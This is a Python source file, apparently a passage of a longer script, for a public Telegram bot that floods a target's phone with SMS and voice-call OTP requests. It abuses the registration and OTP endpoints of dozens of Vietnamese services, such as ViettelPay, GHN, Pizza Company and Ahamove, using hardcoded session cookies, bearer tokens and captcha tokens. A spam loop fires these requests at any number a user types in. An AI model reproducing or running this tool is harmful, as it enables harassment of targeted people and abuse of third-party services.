    json_data = {'account_phone': phone, 'recaptcha_token': '03AFcWeA7v381xRFe3ivbZ6DLZhSCCy-7BXHn8peQLvLsMjhj0gqDLgsPXXn7aMZmjv60dFtXtKwev15IXaOG3Y_ZjsvojTeWHjmgFGw5GfvbMyXCAwTWQCYNLd3kbHpFMr4EyPb-97Nz4C4UF3tBfGm-W32Qq7AnTZdxKiy-W_hQ559telE03X6dcy6TKa7ucbDiXMzir5coCZewqj8pgzNP_4nwex-4WPfVTN_FPiX_ri89IJXis30eau37mXEdm-dcz3tS_lkCz5OZaDthG_zTDzxQhw4QhGGrMdawvC_A9Y8ltN1XoU1YsDjl864Jo2cuQ6JnVJ2GS4jkE17dkrPqBOlI1xYUu3CTv7eUypbccX3685-mAN_GYtZv5Loja3Yv1B7Pec8c6yasF2DiL_SoKB24tD6eTzfo2sWI4euVy2lJiWHlSO0H6K1MOSFMuyISzJevJqTKD_1Rsq351gU76F9mOJ6SVuF0HCRZddIlYgfCsZyOgGL88MZZZjNlArXN871ALM6eBsUwnPcxraflCmlZJ2wEa66EjRuAVH1HUp9EOtW4R4B-xQMFXAOEhLOlG1fpR8b6kF21UbzE00iwWhROOE8XUXA'}
    try:
        requests.post('https://thitruongsi.com/endpoint/v1/user/api/v4/users/register/step1-phone', cookies=cookies, headers=headers, json=json_data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms28(phone):
    global thanhcong
    try:
        requests.post('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister?phoneNumber=' + phone, timeout=10)
        thanhcong += 1
    except:
        pass

def sms29(phone):
    global thanhcong, thatbai
    headers = {'Host': 'online-gateway.ghn.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36'}
    json_data = {'phone': phone, 'type': 'register'}
    try:
        response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data, timeout=10)
        if 'true' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms30(phone):
    global thanhcong, thatbai
    cookies = {'_gcl_au': '1.1.612062991.1693832247'}
    headers = {'Host': 'thepizzacompany.vn', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36', 'x-requested-with': 'XMLHttpRequest'}
    data = {'phone': phone, '__RequestVerificationToken': 'CfDJ8Cl_WAA5AJ9Ml4vmCZFOjMdA6eKbtod3RRZhW0oMAbjY51WN7NObT74BSrixWfCNutY-oIWf45xqyHeDAqa6uoqs1jgc1YTZb9K75G_VbjoHC5Tpa6zerOu5KrKhCjOuHPKVnuUfgka_VUVi1RwMXbg'}
    try:
        response = requests.post('https://thepizzacompany.vn/customer/ResendOtp', cookies=cookies, headers=headers, data=data, timeout=10)
        if 'true' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms31(phone):
    global thanhcong, thatbai
    cookies = {'ubo_token': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ'}
    headers = {'Host': 'ubofood.com', 'content-type': 'application/json; charset=UTF-8', 'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MzUzOTgwNTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjEwMTAxOTAwMCJ9.Yo_06mV-TRA1bUKZAcltCC-QzaV231uwfsVZHpBlxYDqfNrz5_PVXhEBvRCS2CGb5pBH1pN5t_XJqHQtb7xCASn7U472sf3CYdz0Fq-GkxqSksphrVTYqFUMaxVZolzfYr8ZF28rWbDb64ORnEWAf8nFiKM5KlilnVSHcb3vUWtijk1nAE_kMi_3vYlPChvv7FWecDKSZPJeszKnaI3KJzUIRouY0rPWnE_CWJyxblc6UC6c7aMAve6F4KrFzs8wcQTfoem5kpwlg3m4tyLluBIdRSjTlEA4H0k2xL2vmx5odR7IczPpLz-wGpgPSg_5-9Lk4XPAlpz1Q3833KIpXmbKs_rKowLhG8pXH2c_EARzRarDm6Yu0NM4rVQwNHjdHgLUnGTvKi6oPTJ8RWrx5H0mjc0UY15JlxnjCxmq_Z8k4cleFRDvL05LmQovbY5PTiu3Oi5o7BOJUp55AgpbgLTj1M9kW3EyvDwAdUetwYr0qixoTNumiD1DB4Mpha2coGSxse_10ch0J4fFZosuGfqXDHYaITL1FaoEfyVrBDWS2rVZ00llVZQXqBrvk9nEHaWiGzvZGPZRm9G3HJOEKESp99CPkBYCq31b-n8JGwnHNXzfxdT9SE82mAdu5ckZX4x33rYnUUhr6nHqmycysna5Lwickph03Chq88mPyXQ', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'phone_number': phone, 'trade_code': '101019000', 'captcha': '03AFcWeA57DLZ2vpQbBNFdhiRbVl9Tl7LLgZNidOGidwem9Qe35fs7vriYjyeNbAHMucJqqubWkbk3utAUXx4-qrLh-ua7cURkFSvCbwjHP-5c8JzP8X8SYo9pTUGqpvBzMhidETa3Z8VDrHiiIfqmsYmEDqxnboFGMQx5CB44u8UxKmqg2egTmd2FGbYheVmTEPUUMZhP84u8T0N_R8_ybq2_2KhyvBETIX2iZni8vRSjl0osIeZ3GAqrq9goXdsml2AEi5s9HfHvktW00l5xvaNvt4FT-AHcqML0jvq-y95-J7sPzjjZRHpKD1q0Mw9NvGR_iFe6DkKpuuM83OjgWVRW2JxCRDE2FKZQ3p7Z0qIV4NqaxlJdTl6lE0RRqXnUAZiEkN0Rm4sSPhD4JkUYJPkAbDMp9FcVb_23bMBDkFtw7jmVaD6FxLFMC99Yl6xR6AUMp3ECYVHeuGV6zchUydZp3aTQAYgIFAipAUGym3eIRuaeq0TfxIzcRNMAtgkYMrwyVFrT46aMYDhQqScFUQvTRve0tpBcmgIwjyb9893ThF54reVSqAHyYoAHPcEUnXJqxvl3onmNehC_qzdNCN6jX9IKKDsvZA'}
    try:
        response = requests.post('https://ubofood.com/auth/register', cookies=cookies, headers=headers, json=json_data, timeout=10)
        if 'true' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms32(phone):
    global thanhcong
    headers = {'Host': 'api.tiencash.com', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'token': 'null'}
    data = {'phone': phone, 'sign': '67d44dda-b29f-48a4-9830-67121bc618f8'}
    try:
        requests.post('https://api.tiencash.com/v1/verify/sms/send', headers=headers, data=data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms33(phone):
    global thanhcong
    cookies = {'cf_clearance': '7PVCE6rX6Mz9UV9bIHmL7EeNGtGWPPwv2rzp1SjXN6A-1703862357-0-2-9d5da78d.b957bcb1.ca5cf86d-0.2.1703862357'}
    headers = {'Host': 'id.chotot.com', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-nextjs-data': '1'}
    params = {'phone': phone}
    try:
        requests.get('https://id.chotot.com/_next/data/FbXG9nuM-6zJwYIP9V0dP/register/otp.json', params=params, cookies=cookies, headers=headers, timeout=10)
        thanhcong += 1
    except:
        pass

def sms34(phone):
    global thanhcong
    headers = {'Host': 'api.cashbar.tech', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N) AppleWebKit/537.36'}
    data = {'phone': phone, 'type': '2', 'ctype': '1', 'chntoken': ''}
    try:
        requests.post('https://api.cashbar.tech/h5/LoginMessage_ultimate', headers=headers, data=data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms35(phone):
    global thanhcong
    try:
        requests.post('https://www.sapo.vn/fnb/checkphonenumber?phonenumber=' + phone, timeout=10)
        thanhcong += 1
    except:
        pass

def sms36(phone):
    global thanhcong
    try:
        requests.post('https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json?phoneNumber=' + phone, timeout=10)
        thanhcong += 1
    except:
        pass

def sms37(phone):
    global thanhcong
    headers = {'Host': 'nhadat.cafeland.vn', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'x-requested-with': 'XMLHttpRequest', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36'}
    payload = {'mobile': phone, '_token': 'bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w'}
    try:
        requests.post('https://nhadat.cafeland.vn/member-send-otp/', data=payload, headers=headers, timeout=10)
        thanhcong += 1
    except:
        pass

def sms38(phone):
    global thanhcong, thatbai
    phone12 = '+84' + phone
    alo = random_string(8)
    headers = {'Host': 'www.kiotviet.vn', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-requested-with': 'XMLHttpRequest'}
    data = {'phone': phone12, 'code': alo, 'name': 'le van sang', 'email': '', 'zone': 'An Giang - Huyện Châu Phú', 'merchant': 'muabansi', 'username': phone, 'industry': 'Thời trang', 'ref_code': '746', 'industry_id': '77', 'phone_input': phone}
    try:
        response = requests.post('https://www.kiotviet.vn/wp-content/themes/kiotviet/TechAPI/getOTP.php', headers=headers, data=data, timeout=10)
        if 'success' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms39(phone):
    global thanhcong
    cookies = {'_csrf': '973eca1396514e55d251748b39039603b1974232a85e242bfc08063f1c789d2fa%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22IKtajFXbRCbbHEdh_tLbQ4g1lmiP07IS%22%3B%7D'}
    headers = {'Host': 'www.nhaphang247.com', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-csrf-token': 'ZDR1dGxJa2stfwEVBg8zCTZ3FxYkDA8DO0A5Fj19DFoIWRwkXH4iOA==', 'x-requested-with': 'XMLHttpRequest'}
    data = {'phone': phone, 'token': '03AL8dmw-olofZxzuAeuXxDdXsmyMgy6BfZMVUHf7xK_ldn11WRQ_Ni75LkYaBB2vD6rLahRgFlLdMPgGotfuclQC9lLta0nvH0h6u6LEW6HPHU5OnCPJ04S-LVh0aPxwVHlWrJOxmNdUT6P0k1R5yWtjRvp3s60NX0RZSZKFDbXYnr766alQsbLv17M_942ilwyQkv8tBP00HCjU41Hwm8oXlUYqIdVCrw7sHASCV5rlFJ0HksjIY6UX9KpFLNQfL7qmF5fTge43suFmWRhLRrKqOPTT3HwClFqSlvxn09LONUr6ntGuI82aB2okl0J18FBmhWqDZpHlhLgfLyxRq7l0Cd09GbaAZ8-RfQJ2Dc2BpLJkmCupzA-xDM_dtKicThuzA8-2Rg5FyvnSESGMtBnklPAsKfdOZTjJ4HQWhmwCBUqksS8wQuKXsGxNTnZM4LwF5eS08pp6rJFEsPMhYUgpNuKMc0il9L7Ue0bbBLvEjhusIq62MGv3TZTmpvAklikuiXrquHXYCcOb7tBqYdvTPNsR3iNWmi5y7vEsgBfY5SrZ_2R_Bq4nviqDRuB4G2jV8_9DUxp0x'}
    try:
        requests.post('https://www.nhaphang247.com/site/get-code', cookies=cookies, headers=headers, data=data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms40(phone):
    global thanhcong
    headers = {'Host': 'ubofood.com', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjM0MjM5OTAsInJvbGVfY29kZSI6ImN1c3RvbWVyIiwidHJhZGVfY29kZSI6IjM3OTc2MDAwMCJ9.QyAD_zWYVih-q10DAPQW_pCAvh7FDic4rpxgIubO3eqq9rvnzLmFUU3vm8NCRBB-ot4QO8EpyPu8VZ1RDALB7xOJqaUOzJ_sEWwNMZXr9Zl1DB8MsowoneZKq0IeQmF7AsWZ2nOCXQThVXCjDpdX6z0sfDUVbSBCvkoXKElFawG86Eo9VDFqGmR9W6abT8Y04wkeKSIAPc0N9dGUFTwmbjH3ihNWxsTwo2x_tavHlh8uvXR4Cl_qyewiUFaPkvn7joDEAQu04ub530yoge-zzlW2Dqjw0cfT1zH0QPqBS_bhtZQcJ0sxEfVgAHE9w5MIxPA6mSIBn6kGnZpaWa5vlNbxAEcZCAuprIRy9Ap-qIu6tmmlkPMTuOGPAWBaffWtkP28EV4xfNm9CQOTkGTZLKRo3o2YrT1HGm6na08kQZaBmmd5zCdSCDPC4X2xRH8BPpBs08oZfuORCVsWpCcwL_8pvaMbb4wwTEzfFkKAIjzXjFUu4B2Hq4ymNixu-mCcXmW5z5FC-Kzg4b2pUYuf7umoOLAnFVfNK_0j37gSYT0DeLdjWWyS5pZOCom-18XRoOnDhwhA_Dc0Emby-xX-BNiVSXvzderCWsGkffVKSv2NYiAEcVcobY9WvPAwSi-FAfCycO3X3RNb3zVoecfrpu6SCzkbK_atUotFNL_C3uU', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36'}
    data = '{"phone_number":"sdt","trade_code":"379760000"}'.replace('sdt', phone)
    try:
        requests.post('https://ubofood.com/api/v1/account/customers/register', headers=headers, data=data, timeout=10)
        thanhcong += 1
    except:
        pass

def sms41(phone):
    global thanhcong, thatbai
    headers = {'Host': 'api8.viettelpay.vn', 'product': 'VIETTELPAY', 'content-type': 'application/json; charset=UTF-8', 'user-agent': 'okhttp/4.2.2'}
    data = {'type': 'msisdn', 'username': phone}
    try:
        response = requests.post('https://api8.viettelpay.vn/customer/v1/validate/account', json=data, headers=headers, timeout=10, verify=False)
        get_data = response.json()
        if get_data.get('status', {}).get('code') == 'CS9901':
            data = {'hash': '', 'identityType': 'msisdn', 'identityValue': phone, 'imei': 'VTP_' + generate_random_string(32), 'notifyToken': '', 'otp': 'android', 'pin': 'VTP_' + generate_random_string(32), 'transactionId': '', 'type': 'REGISTER', 'typeOs': 'android', 'verifyMethod': 'sms'}
            requests.post('https://api8.viettelpay.vn/customer/v2/accounts/register', json=data, headers=headers, timeout=10, verify=False)
        else:
            data = {'imei': 'VTP_' + generate_random_string(32), 'loginType': 'BASIC', 'msisdn': phone, 'otp': '', 'pin': 'VTP_' + generate_random_string(32), 'requestId': '', 'typeOs': 'android', 'userType': 'msisdn', 'username': phone}
            requests.post('https://api8.viettelpay.vn/auth/v1/authn/login', json=data, headers=headers, timeout=10, verify=False)
        thanhcong += 1
    except:
        thatbai += 1

def sms42(phone):
    global thanhcong
    cookies = {'cf_clearance': 'JADqfh9qf.B.5Cuwpq7ss3q8sD.kp6ycfPzybalacfk-1693616900-0-1-bd488ac1.a2c0bc88.ea49d521-250.2.1693616900'}
    headers = {'Host': 'm.batdongsan.com.vn', 'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36'}
    params = {'phoneNumber': phone}
    try:
        requests.get('https://m.batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, cookies=cookies, headers=headers, timeout=10)
        thanhcong += 1
    except:
        pass

def sms43(phone):
    global thanhcong, thatbai
    headers = {'Host': 'id.icankid.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36'}
    data = {'phone': phone, 'challenge_code': '674b72a1c98013e2fb629e19236d592c466b3de750584c974bba31377c283c00', 'challenge_method': 'SHA256'}
    try:
        response = requests.post('https://id.icankid.vn/api/otp/challenge/', json=data, headers=headers, timeout=10)
        if response.ok:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def sms44(phone):
    global thanhcong
    headers = {'Host': 'api.ahamove.com', 'content-type': 'application/json;charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30'}
    datason = json.dumps({'mobile': phone[1:11], 'name': 'Tuấn', 'email': f'{random_string(6)}@gmail.com', 'country_code': 'VN', 'firebase_sms_auth': 'true'})
    try:
        requests.post('https://api.ahamove.com/api/v3/public/user/register', data=datason, headers=headers, timeout=10)
        thanhcong += 1
    except:
        pass

# === HÀM SPAM CALL ===
def call2(phone):
    global thanhcong, thatbai
    cookies = {'XSRF-TOKEN': 'eyJpdiI6IjB5aHdPNmR1NjR6dGxzUERkeGx1bVE9PSIsInZhbHVlIjoidnhMOVhFVkcweE85MHpsazAxS3RrZ1BMZTVTNXZkanB4MXd1bm5Jb0NtdGEydlBkbk5CODhKSTM2L3lQYlJ5MTRTQ3lVVVowc0JtR013QXNkRm1VRmxXdkZIZFpzaGEyUmp4Vy9uSW1nclNsOTIrdFJaSTVQWnBueXc1VDVRZHoiLCJtYWMiOiJmMGExMWJkZjQwZDYyMzFmMTFkNWYyYmJhZDc3MzM1OTlmOGEzMTc3OWI2ZDNkMTdlNTJiYzRmOTNlMzk0NGEzIiwidGFnIjoiIn0%3D', 'sessionid': 'eyJpdiI6IkdJYVRuM25xVHJOR0ZqblVOQkpMZ0E9PSIsInZhbHVlIjoiUGR4aU1HZytFMmFrbHdzQmxrRmZaaDN1ZzNSRkdJTnNBUkl3U2IybU5HMTBEN0JQNGkxL2lyV1Rub25tNkt2Mmh4WmRhc3RiSWdDekkxbndQUkVnbnBWczZWYnc0VmRLR3Bwdk94ZEVybnhnNFMzcXhGWEtnMzliMnRLdHlvbXYiLCJtYWMiOiIwYjU0YmI0ZGNmMGM1NGVmMTExNDU3YjAyM2EzYmMwZDdkYWYyZWYyZTM5NTAxMDE4NzkyMGI5MjcxMmE3MmJjIiwidGFnIjoiIn0%3D'}
    headers = {'Host': 'vietloan.vn', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'x-requested-with': 'XMLHttpRequest'}
    data = {'phone': phone, '_token': 'LzSrVTbPGjnooEq6rDJnTv6FgLJs2MLlGIZxXwka'}
    try:
        response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data, timeout=10)
        if 'success' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def call3(phone):
    global thanhcong, thatbai
    headers = {'Host': 'api.kimungvay.co', 'content-type': 'application/x-www-form-urlencoded', 'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36'}
    data = {'phone': phone, 'type': '2', 'ctype': '1', 'chntoken': 'e51d233aa164cb9ec126578fc2d553f6'}
    try:
        response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data, timeout=10)
        if 'successfully' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def call4(phone):
    global thanhcong, thatbai
    cookies = {'_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDg2ODQxODA4OQ.L1D5PMjXLrblgQ-kevfx9MDp7PfNA91_Ln01iZ148QE'}
    headers = {'Host': 'lk.takomo.vn', 'content-type': 'application/json;charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'data': {'phone': phone, 'code': 'send', 'channel': 'ivr'}}
    try:
        response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data, timeout=10)
        if 'ok' in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def call5(phone):
    global thanhcong, thatbai
    headers = {'Host': 'api.dongplus.vn', 'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    json_data = {'phone': '84' + phone[1:9]}
    try:
        response = requests.post('https://api.dongplus.vn/api/user/send-one-time-password', headers=headers, json=json_data, timeout=10)
        if "call" in response.text:
            thanhcong += 1
        else:
            thatbai += 1
    except:
        thatbai += 1

def call6(phone):
    global thanhcong
    cookies = {'JSESSIONID': 'D15C9181DF236AE13B2AD4DFC7F826EB'}
    headers = {'Host': 'h5.vivohan.com', 'content-type': 'application/json;charset=UTF-8', 'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N) AppleWebKit/537.36'}
    data = {'phone': phone, 'type': 2, 'timestamp': 1703951639000, 'referrer': 'utm_source=e242', 'af_prt': 'e242', 'sign': '0f656af82eb1da33221a06d1171db265', 'appversion': '1.0.0', 'channel': 1, 'app_version': '1.0.0', 'version': '1.0.0', 'imei': 'f30c673736f5301bd94aaaad5b543d90', 'uuid': 'f30c673736f5301bd94aaaad5b543d90', 'pkg_name': 'com.qcvivo.vivohanh5'}
    try:
        requests.post('https://h5.vivohan.com/api/register/app/sendSms', cookies=cookies, headers=headers, data=data, timeout=10)
        thanhcong += 1
    except:
        pass

# === HÀM SPAM CHÍNH ===
async def spam_attack_async(phone, user_id, context):
    global running, thanhcong, thatbai
    thanhcong = 0
    thatbai = 0
    running = True
    
    # Khởi tạo session cho user
    if user_id not in user_sessions:
        user_sessions[user_id] = {'running': False, 'thanhcong': 0, 'thatbai': 0}
    
    user_sessions[user_id]['running'] = True
    user_sessions[user_id]['thanhcong'] = 0
    user_sessions[user_id]['thatbai'] = 0
    
    num_cycles = 1
    for cycle in range(num_cycles):
        if not user_sessions[user_id]['running']:
            break
        
        # SMS functions
        sms_funcs = [
            sms0, sms1, sms2, sms3, sms4, sms5, sms7, sms8, sms9, sms10,
            sms11, sms12, sms13, sms14, sms15, sms17, sms18, sms19, sms20,
            sms21, sms22, sms23, sms24, sms25, sms26, sms27, sms28, sms29,
            sms30, sms31, sms32, sms33, sms34, sms35, sms36, sms37, sms38,
            sms39, sms40, sms41, sms42, sms43, sms44
        ]
        
        for func in sms_funcs:
            if not user_sessions[user_id]['running']:
                break
            try:
                func(phone)
                thanhcong += 1
                user_sessions[user_id]['thanhcong'] = thanhcong
                await asyncio.sleep(0.3)
            except:
                thatbai += 1
                user_sessions[user_id]['thatbai'] = thatbai
        
        if not user_sessions[user_id]['running']:
            break
            
        # Call functions
        call_funcs = [call2, call3, call4, call5, call6]
        for func in call_funcs:
            if not user_sessions[user_id]['running']:
                break
            try:
                func(phone)
                thanhcong += 1
                user_sessions[user_id]['thanhcong'] = thanhcong
                await asyncio.sleep(1)
            except:
                thatbai += 1
                user_sessions[user_id]['thatbai'] = thatbai
        
        if not user_sessions[user_id]['running']:
            break
            
        await asyncio.sleep(2)
    
    user_sessions[user_id]['running'] = False
    running = False
    return thanhcong, thatbai

# === TELEGRAM BOT HANDLERS ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    keyboard = [
        [InlineKeyboardButton("▶️ Bắt đầu spam", callback_data="start_spam")],
        [InlineKeyboardButton("⏹️ Dừng spam", callback_data="stop_spam")],
        [InlineKeyboardButton("📊 Trạng thái", callback_data="status")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🤖 *Bot Spam SMS/CALL Việt Nam*\n\n"
        "Sử dụng các nút bên dưới để điều khiển.\n"
        "⚠️ Bot công khai - Ai cũng có thể sử dụng.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    
    if query.data == "start_spam":
        if user_sessions.get(user_id, {}).get('running', False):
            await query.edit_message_text("⚠️ Bạn đang chạy spam. Vui lòng dừng trước khi bắt đầu mới.")
            return
        
        await query.edit_message_text("📱 Nhập số điện thoại cần spam (VD: 0987654321):")
        context.user_data['awaiting_phone'] = True
        
    elif query.data == "stop_spam":
        if user_id in user_sessions:
            user_sessions[user_id]['running'] = False
        await query.edit_message_text("⏹️ Đã dừng spam cho bạn.")
        
    elif query.data == "status":
        session = user_sessions.get(user_id, {})
        status_text = (
            f"📊 *Trạng thái của bạn*\n"
            f"─" * 20 + "\n"
            f"🔹 Đang chạy: {'✅' if session.get('running', False) else '❌'}\n"
            f"🔹 Thành công: {session.get('thanhcong', 0)}\n"
            f"🔹 Thất bại: {session.get('thatbai', 0)}\n"
            f"🔹 Tổng: {session.get('thanhcong', 0) + session.get('thatbai', 0)}"
        )
        await query.edit_message_text(status_text, parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if context.user_data.get('awaiting_phone', False):
        phone = update.message.text.strip()
        # Validate phone
        if not re.search(r"^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$", phone):
            await update.message.reply_text("❌ Số điện thoại không hợp lệ. Vui lòng nhập lại (VD: 0987654321):")
            return
        
        context.user_data['awaiting_phone'] = False
        context.user_data['phone_target'] = phone
        
        await update.message.reply_text(
            f"✅ Đã nhận số: {phone}\n"
            "🔄 Bắt đầu spam...\n"
            "⏹️ Dùng nút Dừng để kết thúc."
        )
        
        # Chạy spam trong background
        try:
            success, fail = await spam_attack_async(phone, user_id, context)
            
            await update.message.reply_text(
                f"✅ *Hoàn thành spam*\n"
                f"─" * 20 + "\n"
                f"📱 SĐT: {phone}\n"
                f"✅ Thành công: {success}\n"
                f"❌ Thất bại: {fail}\n"
                f"📊 Tổng: {success + fail}",
                parse_mode="Markdown"
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Lỗi: {str(e)}")

# === MAIN ===
import asyncio

def main():
    # Tạo app
    application = Application.builder().token(TOKEN).build()
    
    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Chạy bot
    print("🤖 Bot đang chạy... (Public - Ai cũng dùng được)")
    print(f"🔑 Token: {TOKEN[:10]}...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

# Thêm vào cuối file bot.py, trước if __name__ == "__main__":

from flask import Flask
import threading

app = Flask(__name__)

@app.route('/')
def health():
    return "Bot is running!"

def run_web():
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 10000)))

# Sửa hàm main:
def main():
    # Chạy bot trong thread riêng
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # Chạy web server để giữ port mở
    run_web()

def run_bot():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
